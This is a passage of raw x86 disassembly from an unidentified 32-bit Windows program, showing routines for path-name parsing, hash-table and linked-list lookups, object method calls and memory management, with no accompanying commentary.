  40b314:	add    esp,0xc
  40b317:	push   0x5c
  40b319:	push   ebx
  40b31a:	call   DWORD PTR ds:0x4243f8
  40b320:	add    esp,0x8
  40b323:	test   eax,eax
  40b325:	je     0x40b32f
  40b327:	add    eax,0x2
  40b32a:	mov    DWORD PTR [ebp-0x4],eax
  40b32d:	jmp    0x40b34f
  40b32f:	push   0x3a
  40b331:	push   ebx
  40b332:	call   DWORD PTR ds:0x4243f4
  40b338:	lea    ecx,[ebx+0x2]
  40b33b:	add    esp,0x8
  40b33e:	cmp    eax,ecx
  40b340:	jne    0x40b34a
  40b342:	lea    eax,[ebx+0x4]
  40b345:	mov    DWORD PTR [ebp-0x4],eax
  40b348:	jmp    0x40b34f
  40b34a:	mov    eax,ebx
  40b34c:	mov    DWORD PTR [ebp-0x4],ebx
  40b34f:	mov    ecx,eax
  40b351:	call   0x40b0b0
  40b356:	movzx  ecx,ax
  40b359:	and    ecx,0x8000007f
  40b35f:	jns    0x40b366
  40b361:	dec    ecx
  40b362:	or     ecx,0xffffff80
  40b365:	inc    ecx
  40b366:	mov    DWORD PTR [ebp-0x8],ecx
  40b369:	xor    esi,esi
  40b36b:	jmp    0x40b370
  40b36d:	lea    ecx,[ecx+0x0]
  40b370:	test   esi,esi
  40b372:	je     0x40b378
  40b374:	mov    esi,DWORD PTR [esi]
  40b376:	jmp    0x40b380
  40b378:	mov    eax,ds:0x40e094
  40b37d:	mov    esi,DWORD PTR [eax+ecx*4]
  40b380:	test   esi,esi
  40b382:	je     0x40b40d
  40b388:	mov    ecx,DWORD PTR ds:0x40e430
  40b38e:	lea    edx,[ebp-0xc]
  40b391:	mov    eax,DWORD PTR [ecx]
  40b393:	push   edx
  40b394:	push   DWORD PTR [esi+0x4]
  40b397:	call   DWORD PTR [eax+0x38]
  40b39a:	test   eax,eax
  40b39c:	je     0x40b42e
  40b3a2:	mov    edi,DWORD PTR [ebp-0xc]
  40b3a5:	push   0x5c
  40b3a7:	push   edi
  40b3a8:	call   DWORD PTR ds:0x4243f8
  40b3ae:	add    esp,0x8
  40b3b1:	test   eax,eax
  40b3b3:	je     0x40b3ba
  40b3b5:	add    eax,0x2
  40b3b8:	jmp    0x40b3d2
  40b3ba:	push   0x3a
  40b3bc:	push   edi
  40b3bd:	call   DWORD PTR ds:0x4243f4
  40b3c3:	lea    ecx,[edi+0x2]
  40b3c6:	add    esp,0x8
  40b3c9:	cmp    eax,ecx
  40b3cb:	lea    eax,[edi+0x4]
  40b3ce:	je     0x40b3d2
  40b3d0:	mov    eax,edi
  40b3d2:	push   DWORD PTR [ebp-0x4]
  40b3d5:	push   eax
  40b3d6:	call   DWORD PTR ds:0x4244bc
  40b3dc:	mov    ecx,DWORD PTR [ebp-0x8]
  40b3df:	add    esp,0x8
  40b3e2:	test   eax,eax
  40b3e4:	jne    0x40b370
  40b3e6:	mov    edx,0x40e438
  40b3eb:	mov    ecx,edi
  40b3ed:	call   0x409e70
  40b3f2:	push   eax
  40b3f3:	push   ebx
  40b3f4:	call   DWORD PTR ds:0x4244bc
  40b3fa:	mov    ecx,DWORD PTR [ebp-0x8]
  40b3fd:	add    esp,0x8
  40b400:	test   eax,eax
  40b402:	jne    0x40b370
  40b408:	mov    esi,DWORD PTR [esi+0x8]
  40b40b:	jmp    0x40b40f
  40b40d:	xor    esi,esi
  40b40f:	mov    eax,DWORD PTR [ebp-0x24]
  40b412:	test   eax,eax
  40b414:	je     0x40b425
  40b416:	push   eax
  40b417:	push   0x0
  40b419:	push   DWORD PTR ds:0x40e648
  40b41f:	call   DWORD PTR ds:0x4242c0
  40b425:	pop    edi
  40b426:	mov    eax,esi
  40b428:	pop    esi
  40b429:	pop    ebx
  40b42a:	mov    esp,ebp
  40b42c:	pop    ebp
  40b42d:	ret    
  40b42e:	push   0x0
  40b430:	mov    edx,0x4010c0
  40b435:	mov    ecx,0x5e5
  40b43a:	call   0x407010
  40b43f:	int3   
  40b440:	push   ebp
  40b441:	mov    ebp,esp
  40b443:	sub    esp,0x8
  40b446:	mov    edx,ecx
  40b448:	mov    ecx,DWORD PTR ds:0x40e430
  40b44e:	push   esi
  40b44f:	mov    eax,DWORD PTR [ecx]
  40b451:	push   edi
  40b452:	lea    esi,[ebp-0x4]
  40b455:	push   esi
  40b456:	push   edx
  40b457:	call   DWORD PTR [eax+0x20]
  40b45a:	test   eax,eax
  40b45c:	je     0x40b4d4
  40b45e:	mov    esi,DWORD PTR [ebp-0x4]
  40b461:	push   esi
  40b462:	call   DWORD PTR ds:0x40e0a0
  40b468:	movzx  eax,ax
  40b46b:	cdq    
  40b46c:	idiv   DWORD PTR ds:0x40e09c
  40b472:	mov    eax,ds:0x40e094
  40b477:	add    esp,0x4
  40b47a:	mov    eax,DWORD PTR [eax+edx*4]
  40b47d:	test   eax,eax
  40b47f:	je     0x40b48c
  40b481:	cmp    DWORD PTR [eax+0x4],esi
  40b484:	je     0x40b4cb
  40b486:	mov    eax,DWORD PTR [eax]
  40b488:	test   eax,eax
  40b48a:	jne    0x40b481
  40b48c:	push   0x2e
  40b48e:	push   0x0
  40b490:	push   DWORD PTR ds:0x40e648
  40b496:	call   DWORD PTR ds:0x4242c4
  40b49c:	test   eax,eax
  40b49e:	je     0x40b4d4
  40b4a0:	mov    ecx,eax
  40b4a2:	call   0x4025c0
  40b4a7:	mov    edi,eax
  40b4a9:	test   edi,edi
  40b4ab:	je     0x40b4d4
  40b4ad:	push   edi
  40b4ae:	xor    eax,eax
  40b4b0:	push   esi
  40b4b1:	mov    DWORD PTR [edi],esi
  40b4b3:	mov    WORD PTR [edi+0x1a],ax
  40b4b7:	call   0x40c390
  40b4bc:	mov    BYTE PTR ds:0x40e038,0x0
  40b4c3:	mov    eax,edi
  40b4c5:	pop    edi
  40b4c6:	pop    esi
  40b4c7:	mov    esp,ebp
  40b4c9:	pop    ebp
  40b4ca:	ret    
  40b4cb:	mov    eax,DWORD PTR [eax+0x8]
  40b4ce:	pop    edi
  40b4cf:	pop    esi
  40b4d0:	mov    esp,ebp
  40b4d2:	pop    ebp
  40b4d3:	ret    
  40b4d4:	push   0x0
  40b4d6:	mov    edx,0x4010c0
  40b4db:	mov    ecx,0x5e5
  40b4e0:	call   0x407010
  40b4e5:	int3   
  40b4e6:	int3   
  40b4e7:	int3   
  40b4e8:	int3   
  40b4e9:	int3   
  40b4ea:	int3   
  40b4eb:	int3   
  40b4ec:	int3   
  40b4ed:	int3   
  40b4ee:	int3   
  40b4ef:	int3   
  40b4f0:	push   ebp
  40b4f1:	mov    ebp,esp
  40b4f3:	push   ecx
  40b4f4:	mov    eax,ds:0x41f368
  40b4f9:	push   ebx
  40b4fa:	push   esi
  40b4fb:	push   edi
  40b4fc:	mov    DWORD PTR [ebp-0x4],eax
  40b4ff:	test   eax,eax
  40b501:	je     0x40b56a
  40b503:	mov    ebx,DWORD PTR [eax+0x8]
  40b506:	test   ebx,ebx
  40b508:	je     0x40b50e
  40b50a:	mov    ebx,DWORD PTR [ebx]
  40b50c:	jmp    0x40b510
  40b50e:	xor    ebx,ebx
  40b510:	xor    edi,edi
  40b512:	test   ebx,ebx
  40b514:	jle    0x40b560
  40b516:	mov    eax,DWORD PTR [eax+0x8]
  40b519:	mov    esi,DWORD PTR [eax+edi*4+0x4]
  40b51d:	push   esi
  40b51e:	call   DWORD PTR ds:0x40e0a0
  40b524:	movzx  eax,ax
  40b527:	cdq    
  40b528:	idiv   DWORD PTR ds:0x40e09c
  40b52e:	mov    eax,ds:0x40e094
  40b533:	add    esp,0x4
  40b536:	mov    eax,DWORD PTR [eax+edx*4]
  40b539:	test   eax,eax
  40b53b:	je     0x40b558
  40b53d:	lea    ecx,[ecx+0x0]
  40b540:	cmp    DWORD PTR [eax+0x4],esi
  40b543:	je     0x40b54d
  40b545:	mov    eax,DWORD PTR [eax]
  40b547:	test   eax,eax
  40b549:	jne    0x40b540
  40b54b:	jmp    0x40b558
  40b54d:	mov    eax,DWORD PTR [eax+0x8]
  40b550:	test   eax,eax
  40b552:	je     0x40b558
  40b554:	mov    BYTE PTR [eax+0xd],0x1
  40b558:	mov    eax,DWORD PTR [ebp-0x4]
  40b55b:	inc    edi
  40b55c:	cmp    edi,ebx
  40b55e:	jl     0x40b516
  40b560:	mov    eax,DWORD PTR [eax+0x4]
  40b563:	mov    DWORD PTR [ebp-0x4],eax
  40b566:	test   eax,eax
  40b568:	jne    0x40b503
  40b56a:	or     ecx,0xffffffff
  40b56d:	xor    edx,edx
  40b56f:	nop
  40b570:	test   edx,edx
  40b572:	je     0x40b580
  40b574:	mov    edx,DWORD PTR [edx]
  40b576:	test   edx,edx
  40b578:	jne    0x40b595
  40b57a:	lea    ebx,[ebx+0x0]
  40b580:	inc    ecx
  40b581:	cmp    ecx,DWORD PTR ds:0x40e09c
  40b587:	jge    0x40b5a7
  40b589:	mov    eax,ds:0x40e094
  40b58e:	mov    edx,DWORD PTR [eax+ecx*4]
  40b591:	test   edx,edx
  40b593:	je     0x40b580
  40b595:	mov    eax,DWORD PTR [edx+0x8]
  40b598:	cmp    BYTE PTR [eax+0xd],0x0
  40b59c:	jne    0x40b570
  40b59e:	mov    BYTE PTR ds:0x40e038,0x0
  40b5a5:	jmp    0x40b570
  40b5a7:	pop    edi
  40b5a8:	pop    esi
  40b5a9:	pop    ebx
  40b5aa:	mov    esp,ebp
  40b5ac:	pop    ebp
  40b5ad:	ret    
  40b5ae:	int3   
  40b5af:	int3   
  40b5b0:	push   ebp
  40b5b1:	mov    ebp,esp
  40b5b3:	and    esp,0xfffffff8
  40b5b6:	sub    esp,0x1c
  40b5b9:	push   ebx
  40b5ba:	push   esi
  40b5bb:	push   edi
  40b5bc:	call   0x40b4f0
  40b5c1:	cmp    BYTE PTR ds:0x40e038,0x0
  40b5c8:	jne    0x40b711
  40b5ce:	mov    ebx,DWORD PTR ds:0x40e098
  40b5d4:	mov    esi,DWORD PTR ds:0x424424
  40b5da:	push   ebx
  40b5db:	push   0x4
  40b5dd:	mov    DWORD PTR [esp+0x20],ebx
  40b5e1:	call   esi
  40b5e3:	add    esp,0x8
  40b5e6:	mov    DWORD PTR [esp+0x1c],eax
  40b5ea:	test   eax,eax
  40b5ec:	je     0x40b718
  40b5f2:	push   ebx
  40b5f3:	push   0x4
  40b5f5:	call   esi
  40b5f7:	add    esp,0x8
  40b5fa:	mov    DWORD PTR [esp+0x10],eax
  40b5fe:	test   eax,eax
  40b600:	je     0x40b729
  40b606:	or     esi,0xffffffff
  40b609:	xor    edi,edi
  40b60b:	mov    DWORD PTR [esp+0x14],eax
  40b60f:	mov    edx,DWORD PTR ds:0x40e094
  40b615:	mov    ecx,DWORD PTR ds:0x40e09c
  40b61b:	jmp    0x40b620
  40b61d:	lea    ecx,[ecx+0x0]
  40b620:	test   edi,edi
  40b622:	je     0x40b630
  40b624:	mov    edi,DWORD PTR [edi]
  40b626:	test   edi,edi
  40b628:	jne    0x40b63c
  40b62a:	lea    ebx,[ebx+0x0]
  40b630:	inc    esi
  40b631:	cmp    esi,ecx
  40b633:	jge    0x40b67a
  40b635:	mov    edi,DWORD PTR [edx+esi*4]
  40b638:	test   edi,edi
  40b63a:	je     0x40b630
  40b63c:	mov    eax,DWORD PTR [edi+0x8]
  40b63f:	cmp    BYTE PTR [eax+0xd],0x0
  40b643:	jne    0x40b64c
  40b645:	dec    ebx
  40b646:	mov    DWORD PTR [esp+0x18],ebx
  40b64a:	jmp    0x40b620
  40b64c:	mov    ecx,DWORD PTR ds:0x40e430
  40b652:	lea    edx,[esp+0x24]
  40b656:	mov    eax,DWORD PTR [ecx]
  40b658:	push   edx
  40b659:	push   DWORD PTR [edi+0x4]
  40b65c:	call   DWORD PTR [eax+0x38]
  40b65f:	test   eax,eax
  40b661:	je     0x40b718
  40b667:	mov    ecx,DWORD PTR [esp+0x14]
  40b66b:	mov    eax,DWORD PTR [esp+0x24]
  40b66f:	mov    DWORD PTR [ecx],eax
  40b671:	add    ecx,0x4
  40b674:	mov    DWORD PTR [esp+0x14],ecx
  40b678:	jmp    0x40b60f
  40b67a:	mov    edi,DWORD PTR [esp+0x10]
  40b67e:	lea    eax,[ebx-0x1]
  40b681:	push   eax
  40b682:	xor    edx,edx
  40b684:	mov    ecx,edi
  40b686:	call   0x40c590
  40b68b:	add    esp,0x4
  40b68e:	test   ebx,ebx
  40b690:	jle    0x40b6bf
  40b692:	mov    esi,edi
  40b694:	mov    edi,DWORD PTR [esp+0x1c]
  40b698:	sub    edi,esi
  40b69a:	mov    DWORD PTR [esp+0x24],ebx
  40b69e:	mov    edi,edi
  40b6a0:	mov    ecx,DWORD PTR ds:0x40e430
  40b6a6:	lea    eax,[edi+esi*1]
  40b6a9:	mov    edx,DWORD PTR [ecx]
  40b6ab:	push   eax
  40b6ac:	push   DWORD PTR [esi]
  40b6ae:	call   DWORD PTR [edx+0x20]
  40b6b1:	lea    esi,[esi+0x4]
  40b6b4:	dec    ebx
  40b6b5:	jne    0x40b6a0
  40b6b7:	mov    ebx,DWORD PTR [esp+0x18]
  40b6bb:	mov    edi,DWORD PTR [esp+0x10]
  40b6bf:	mov    ecx,DWORD PTR ds:0x40e42c
  40b6c5:	lea    edx,[esp+0x20]
  40b6c9:	mov    eax,DWORD PTR [ecx]
  40b6cb:	push   edx
  40b6cc:	push   0x401bc4
  40b6d1:	call   DWORD PTR [eax+0x60]
  40b6d4:	test   eax,eax
  40b6d6:	je     0x40b73a
  40b6d8:	mov    ecx,DWORD PTR [esp+0x20]
  40b6dc:	lea    eax,[ebx*4+0x0]
  40b6e3:	mov    ebx,DWORD PTR [esp+0x1c]
  40b6e7:	mov    edx,DWORD PTR [ecx]
  40b6e9:	push   eax
  40b6ea:	push   ebx
  40b6eb:	call   DWORD PTR [edx+0xc]
  40b6ee:	test   eax,eax
  40b6f0:	je     0x40b73a
  40b6f2:	mov    ecx,DWORD PTR [esp+0x20]
  40b6f6:	mov    eax,DWORD PTR [ecx]
  40b6f8:	call   DWORD PTR [eax+0x18]
  40b6fb:	test   eax,eax
  40b6fd:	je     0x40b73a
  40b6ff:	mov    esi,DWORD PTR ds:0x42441c
  40b705:	push   ebx
  40b706:	call   esi
  40b708:	add    esp,0x4
  40b70b:	push   edi
  40b70c:	call   esi
  40b70e:	add    esp,0x4
  40b711:	pop    edi
  40b712:	pop    esi
  40b713:	pop    ebx
  40b714:	mov    esp,ebp
  40b716:	pop    ebp
  40b717:	ret    
  40b718:	push   0x0
  40b71a:	mov    edx,0x4010c0
  40b71f:	mov    ecx,0x5e5
  40b724:	call   0x407010
  40b729:	push   0x0
  40b72b:	mov    edx,0x4010c0
  40b730:	mov    ecx,0x5e5
  40b735:	call   0x407010
  40b73a:	mov    edx,DWORD PTR ds:0x40e644
  40b740:	push   0x0
  40b742:	mov    ecx,0x5df
  40b747:	call   0x407010
  40b74c:	int3   
  40b74d:	int3   
  40b74e:	int3   
  40b74f:	int3   
  40b750:	push   ebp
  40b751:	mov    ebp,esp
  40b753:	mov    ecx,DWORD PTR ds:0x40e42c
  40b759:	sub    esp,0xc
  40b75c:	mov    eax,DWORD PTR [ecx]
  40b75e:	lea    edx,[ebp-0x4]
  40b761:	push   edx
  40b762:	push   0x401bc4
  40b767:	call   DWORD PTR [eax+0x60]
  40b76a:	test   eax,eax
  40b76c:	je     0x40b784
  40b76e:	mov    ecx,DWORD PTR [ebp-0x4]
  40b771:	mov    eax,DWORD PTR [ecx]
  40b773:	call   DWORD PTR [eax]
  40b775:	mov    DWORD PTR [ebp-0x8],eax
  40b778:	test   eax,eax
  40b77a:	jne    0x40b788
  40b77c:	mov    ecx,DWORD PTR [ebp-0x4]
  40b77f:	mov    eax,DWORD PTR [ecx]
  40b781:	call   DWORD PTR [eax+0x18]
  40b784:	mov    esp,ebp
  40b786:	pop    ebp
  40b787:	ret    
  40b788:	push   ebx
  40b789:	push   esi
  40b78a:	push   edi
  40b78b:	mov    edi,eax
  40b78d:	push   0x1
  40b78f:	push   eax
  40b790:	shr    edi,0x2
  40b793:	call   DWORD PTR ds:0x424424
  40b799:	mov    ebx,eax
  40b79b:	add    esp,0x8
  40b79e:	test   ebx,ebx
  40b7a0:	je     0x40b81c
  40b7a2:	mov    ecx,DWORD PTR [ebp-0x4]
  40b7a5:	lea    edx,[ebp-0x8]
  40b7a8:	mov    eax,DWORD PTR [ecx]
  40b7aa:	push   edx
  40b7ab:	push   ebx
  40b7ac:	push   0x0
  40b7ae:	call   DWORD PTR [eax+0x4]
  40b7b1:	test   eax,eax
  40b7b3:	je     0x40b82d
  40b7b5:	lea    eax,[edi*4+0x0]
  40b7bc:	cmp    DWORD PTR [ebp-0x8],eax
  40b7bf:	jne    0x40b82d
  40b7c1:	xor    esi,esi
  40b7c3:	test   edi,edi
  40b7c5:	jle    0x40b7fc
  40b7c7:	jmp    0x40b7d0
  40b7c9:	lea    esp,[esp+0x0]
  40b7d0:	mov    ecx,DWORD PTR ds:0x40e430
  40b7d6:	lea    edx,[ebp-0xc]
  40b7d9:	mov    eax,DWORD PTR [ecx]
  40b7db:	push   edx
  40b7dc:	push   DWORD PTR [ebx+esi*4]
  40b7df:	call   DWORD PTR [eax+0x38]
  40b7e2:	test   eax,eax
  40b7e4:	je     0x40b81c
  40b7e6:	mov    ecx,DWORD PTR [ebp-0xc]
  40b7e9:	call   0x40b440
  40b7ee:	inc    esi
  40b7ef:	mov    ecx,0xffff
  40b7f4:	mov    WORD PTR [eax+0x1a],cx
  40b7f8:	cmp    esi,edi
  40b7fa:	jl     0x40b7d0
  40b7fc:	push   ebx
  40b7fd:	call   DWORD PTR ds:0x42441c
  40b803:	mov    ecx,DWORD PTR [ebp-0x4]
  40b806:	add    esp,0x4
  40b809:	mov    eax,DWORD PTR [ecx]
  40b80b:	call   DWORD PTR [eax+0x18]
  40b80e:	pop    edi
  40b80f:	pop    esi
  40b810:	mov    BYTE PTR ds:0x40e038,0x1
  40b817:	pop    ebx
  40b818:	mov    esp,ebp
  40b81a:	pop    ebp
  40b81b:	ret    
  40b81c:	push   0x0
  40b81e:	mov    edx,0x4010c0
  40b823:	mov    ecx,0x5e5
  40b828:	call   0x407010
  40b82d:	mov    edx,DWORD PTR ds:0x40e644
  40b833:	push   0x0
  40b835:	mov    ecx,0x5e1
  40b83a:	call   0x407010
  40b83f:	int3   
  40b840:	push   ebp
  40b841:	mov    ebp,esp
  40b843:	sub    esp,0x410
  40b849:	mov    eax,ds:0x40e018
  40b84e:	xor    eax,ebp
  40b850:	mov    DWORD PTR [ebp-0x4],eax
  40b853:	mov    ecx,edx
  40b855:	lea    edx,[ebp-0x410]
  40b85b:	mov    DWORD PTR [ebp-0x410],0x401bfc
  40b865:	mov    DWORD PTR [ebp-0x408],0x0
  40b86f:	mov    DWORD PTR [ebp-0x40c],0x0
  40b879:	call   0x40c750
  40b87e:	test   eax,eax
  40b880:	je     0x40b8d4
  40b882:	push   ebx
  40b883:	push   esi
  40b884:	mov    edx,eax
  40b886:	mov    ecx,0x1
  40b88b:	call   0x40b8f0
  40b890:	mov    esi,DWORD PTR [ebp-0x408]
  40b896:	mov    ebx,eax
  40b898:	mov    DWORD PTR [ebp-0x410],0x401bfc
  40b8a2:	test   esi,esi
  40b8a4:	je     0x40b8c2
  40b8a6:	push   edi
  40b8a7:	mov    edi,DWORD PTR ds:0x4242c0
  40b8ad:	lea    ecx,[ecx+0x0]
  40b8b0:	push   esi
  40b8b1:	mov    esi,DWORD PTR [esi]
  40b8b3:	push   0x0
  40b8b5:	push   DWORD PTR ds:0x40e648
  40b8bb:	call   edi
  40b8bd:	test   esi,esi
  40b8bf:	jne    0x40b8b0
  40b8c1:	pop    edi
  40b8c2:	mov    ecx,DWORD PTR [ebp-0x4]
  40b8c5:	pop    esi
  40b8c6:	mov    eax,ebx
  40b8c8:	xor    ecx,ebp
  40b8ca:	pop    ebx
  40b8cb:	call   0x40d492
  40b8d0:	mov    esp,ebp
  40b8d2:	pop    ebp
  40b8d3:	ret    
  40b8d4:	push   0x0
  40b8d6:	mov    edx,0x4010c0
  40b8db:	mov    ecx,0x5e5
  40b8e0:	call   0x407010
  40b8e5:	int3   
  40b8e6:	int3   
  40b8e7:	int3   
  40b8e8:	int3   
  40b8e9:	int3   
  40b8ea:	int3   
  40b8eb:	int3   
  40b8ec:	int3   
  40b8ed:	int3   
  40b8ee:	int3   
  40b8ef:	int3   
  40b8f0:	push   ebp
  40b8f1:	mov    ebp,esp
  40b8f3:	push   ecx
  40b8f4:	push   ebx
  40b8f5:	push   esi
  40b8f6:	mov    esi,DWORD PTR ds:0x41f368
  40b8fc:	push   edi
  40b8fd:	mov    ebx,edx
  40b8ff:	mov    WORD PTR [ebp-0x2],cx
  40b903:	test   esi,esi
  40b905:	je     0x40b925
  40b907:	mov    edi,DWORD PTR ds:0x4244bc
  40b90d:	lea    ecx,[ecx+0x0]
  40b910:	lea    eax,[esi+0xc]
  40b913:	push   ebx
  40b914:	push   eax
  40b915:	call   edi
  40b917:	add    esp,0x8
  40b91a:	test   eax,eax
  40b91c:	je     0x40b95a
  40b91e:	mov    esi,DWORD PTR [esi+0x4]
  40b921:	test   esi,esi
  40b923:	jne    0x40b910
  40b925:	mov    esi,ebx
  40b927:	lea    ecx,[esi+0x2]
  40b92a:	lea    ebx,[ebx+0x0]
  40b930:	mov    ax,WORD PTR [esi]
  40b933:	add    esi,0x2
  40b936:	test   ax,ax
  40b939:	jne    0x40b930
  40b93b:	sub    esi,ecx
  40b93d:	sar    esi,1
  40b93f:	push   0x1
  40b941:	lea    eax,[esi*2+0xe]
  40b948:	push   eax
  40b949:	call   DWORD PTR ds:0x424424
  40b94f:	mov    edi,eax
  40b951:	add    esp,0x8
  40b954:	test   edi,edi
  40b956:	jne    0x40b96a
  40b958:	jmp    0x40b9bc
  40b95a:	mov    ax,WORD PTR [ebp-0x2]
  40b95e:	or     WORD PTR [esi],ax
  40b961:	mov    eax,esi
  40b963:	pop    edi
  40b964:	pop    esi
  40b965:	pop    ebx
  40b966:	mov    esp,ebp
  40b968:	pop    ebp
  40b969:	ret    
  40b96a:	mov    ax,WORD PTR [ebp-0x2]
  40b96e:	mov    WORD PTR [edi],ax
  40b971:	mov    eax,0xffff
  40b976:	mov    WORD PTR [edi+0x2],ax
  40b97a:	push   ebx
  40b97b:	lea    eax,[esi+0x1]
  40b97e:	push   eax
  40b97f:	lea    eax,[edi+0xc]
  40b982:	push   eax
  40b983:	mov    DWORD PTR [edi+0x4],0x0
  40b98a:	call   DWORD PTR ds:0x4244b8
  40b990:	mov    eax,ds:0x41f36c
  40b995:	add    esp,0xc
  40b998:	test   eax,eax
  40b99a:	je     0x40b9a1
  40b99c:	mov    DWORD PTR [eax+0x4],edi
  40b99f:	jmp    0x40b9a7
  40b9a1:	mov    DWORD PTR ds:0x41f368,edi
  40b9a7:	inc    DWORD PTR ds:0x41f370
  40b9ad:	mov    DWORD PTR ds:0x41f36c,edi
  40b9b3:	mov    eax,edi
  40b9b5:	pop    edi
  40b9b6:	pop    esi
  40b9b7:	pop    ebx
  40b9b8:	mov    esp,ebp
  40b9ba:	pop    ebp
  40b9bb:	ret    
  40b9bc:	push   0x0
  40b9be:	mov    edx,0x4010c0
  40b9c3:	mov    ecx,0x5e5
  40b9c8:	call   0x407010
  40b9cd:	int3   
  40b9ce:	int3   
  40b9cf:	int3   
  40b9d0:	push   ebx
  40b9d1:	push   esi
  40b9d2:	mov    esi,DWORD PTR ds:0x41f368
  40b9d8:	push   edi
  40b9d9:	mov    ebx,ecx
  40b9db:	test   esi,esi
  40b9dd:	je     0x40b9fa
  40b9df:	mov    edi,DWORD PTR ds:0x4244bc
  40b9e5:	lea    eax,[esi+0xc]
  40b9e8:	push   ebx
  40b9e9:	push   eax
  40b9ea:	call   edi
  40b9ec:	add    esp,0x8
  40b9ef:	test   eax,eax
  40b9f1:	je     0x40ba00
  40b9f3:	mov    esi,DWORD PTR [esi+0x4]
  40b9f6:	test   esi,esi
  40b9f8:	jne    0x40b9e5
  40b9fa:	pop    edi
  40b9fb:	pop    esi
  40b9fc:	xor    eax,eax
  40b9fe:	pop    ebx
  40b9ff:	ret    
  40ba00:	pop    edi
  40ba01:	mov    eax,esi
  40ba03:	pop    esi
  40ba04:	pop    ebx
  40ba05:	ret    
  40ba06:	int3   
  40ba07:	int3   
  40ba08:	int3   
  40ba09:	int3   
  40ba0a:	int3   
  40ba0b:	int3   
  40ba0c:	int3   
  40ba0d:	int3   
  40ba0e:	int3   
  40ba0f:	int3   
  40ba10:	push   ebp
  40ba11:	mov    ebp,esp
  40ba13:	mov    ecx,DWORD PTR ds:0x40e42c
  40ba19:	sub    esp,0x10
  40ba1c:	mov    eax,DWORD PTR [ecx]
  40ba1e:	lea    edx,[ebp-0x8]
  40ba21:	push   edx
  40ba22:	push   0x401be0
  40ba27:	call   DWORD PTR [eax+0x60]
  40ba2a:	test   eax,eax
  40ba2c:	je     0x40ba44
  40ba2e:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba31:	mov    eax,DWORD PTR [ecx]
  40ba33:	call   DWORD PTR [eax]
  40ba35:	mov    DWORD PTR [ebp-0xc],eax
  40ba38:	test   eax,eax
  40ba3a:	jne    0x40ba4d
  40ba3c:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba3f:	mov    eax,DWORD PTR [ecx]
  40ba41:	call   DWORD PTR [eax+0x18]
  40ba44:	call   0x40bbe0
  40ba49:	mov    esp,ebp
  40ba4b:	pop    ebp
  40ba4c:	ret    
  40ba4d:	push   ebx
  40ba4e:	push   esi
  40ba4f:	push   edi
  40ba50:	push   0x1
  40ba52:	push   eax
  40ba53:	call   DWORD PTR ds:0x424424
  40ba59:	mov    edi,eax
  40ba5b:	add    esp,0x8
  40ba5e:	mov    DWORD PTR [ebp-0x10],edi
  40ba61:	test   edi,edi
  40ba63:	je     0x40bb97
  40ba69:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba6c:	lea    edx,[ebp-0xc]
  40ba6f:	mov    eax,DWORD PTR [ecx]
  40ba71:	push   edx
  40ba72:	push   edi
  40ba73:	push   0x0
  40ba75:	call   DWORD PTR [eax+0x4]
  40ba78:	test   eax,eax
  40ba7a:	je     0x40bba8
  40ba80:	xor    ebx,ebx
  40ba82:	mov    esi,edi
  40ba84:	mov    DWORD PTR [ebp-0x4],ebx
  40ba87:	cmp    BYTE PTR [edi],bl
  40ba89:	je     0x40bade
  40ba8b:	jmp    0x40ba90
  40ba8d:	lea    ecx,[ecx+0x0]
  40ba90:	mov    edx,esi
  40ba92:	call   0x40b840
  40ba97:	mov    edx,eax
  40ba99:	mov    ecx,esi
  40ba9b:	mov    WORD PTR [edx+0x2],bx
  40ba9f:	lea    edi,[ecx+0x1]
  40baa2:	mov    al,BYTE PTR [ecx]
  40baa4:	inc    ecx
  40baa5:	test   al,al
  40baa7:	jne    0x40baa2
  40baa9:	sub    ecx,edi
  40baab:	movzx  edi,WORD PTR [esi+ecx*1+0x1]
  40bab0:	add    esi,ecx
  40bab2:	add    esi,0x3
  40bab5:	test   edi,edi
  40bab7:	je     0x40bad2
  40bab9:	lea    ebx,[edx+0x8]
  40babc:	lea    esp,[esp+0x0]
  40bac0:	push   DWORD PTR [esi]
  40bac2:	mov    ecx,ebx
  40bac4:	call   0x4060c0
  40bac9:	add    esi,0x4
  40bacc:	dec    edi
  40bacd:	jne    0x40bac0
  40bacf:	mov    ebx,DWORD PTR [ebp-0x4]
  40bad2:	inc    ebx
  40bad3:	cmp    BYTE PTR [esi],0x0
  40bad6:	mov    DWORD PTR [ebp-0x4],ebx
  40bad9:	jne    0x40ba90
  40badb:	mov    edi,DWORD PTR [ebp-0x10]
  40bade:	push   edi
  40badf:	call   DWORD PTR ds:0x42441c
  40bae5:	push   0x1
  40bae7:	push   DWORD PTR ds:0x41f370
  40baed:	call   DWORD PTR ds:0x424424
  40baf3:	mov    edx,eax
  40baf5:	add    esp,0xc
  40baf8:	test   edx,edx
  40bafa:	je     0x40bbba
  40bb00:	mov    esi,DWORD PTR ds:0x41f368
  40bb06:	xor    edi,edi
  40bb08:	mov    DWORD PTR ds:0x40eaec,edx
  40bb0e:	test   esi,esi
  40bb10:	je     0x40bbcb
  40bb16:	mov    eax,0xffff
  40bb1b:	jmp    0x40bb20
  40bb1d:	lea    ecx,[ecx+0x0]
  40bb20:	cmp    WORD PTR [esi+0x2],ax
  40bb24:	jne    0x40bb2e
  40bb26:	mov    WORD PTR [esi+0x2],bx
  40bb2a:	inc    ebx
  40bb2b:	mov    DWORD PTR [ebp-0x4],ebx
  40bb2e:	movzx  ebx,WORD PTR [esi]
  40bb31:	cmp    ebx,0x2
  40bb34:	jne    0x40bb4a
  40bb36:	push   ecx
  40bb37:	lea    edx,[esi+0xc]
  40bb3a:	call   0x407290
  40bb3f:	mov    edx,DWORD PTR ds:0x40eaec
  40bb45:	add    esp,0x4
  40bb48:	jmp    0x40bb54
  40bb4a:	test   bl,0x2
  40bb4d:	je     0x40bb54
  40bb4f:	mov    edi,0x1
  40bb54:	test   bl,0x4
  40bb57:	jne    0x40bb69
  40bb59:	test   bl,0x1
  40bb5c:	je     0x40bb65
  40bb5e:	not    ebx
  40bb60:	test   bl,0x2
  40bb63:	jne    0x40bb69
  40bb65:	xor    ecx,ecx
  40bb67:	jmp    0x40bb6e
  40bb69:	mov    ecx,0x1
  40bb6e:	movzx  eax,WORD PTR [esi+0x2]
  40bb72:	mov    ebx,DWORD PTR [ebp-0x4]
  40bb75:	mov    BYTE PTR [eax+edx*1],cl
  40bb78:	mov    esi,DWORD PTR [esi+0x4]
  40bb7b:	mov    eax,0xffff
  40bb80:	test   esi,esi
  40bb82:	jne    0x40bb20
  40bb84:	test   edi,edi
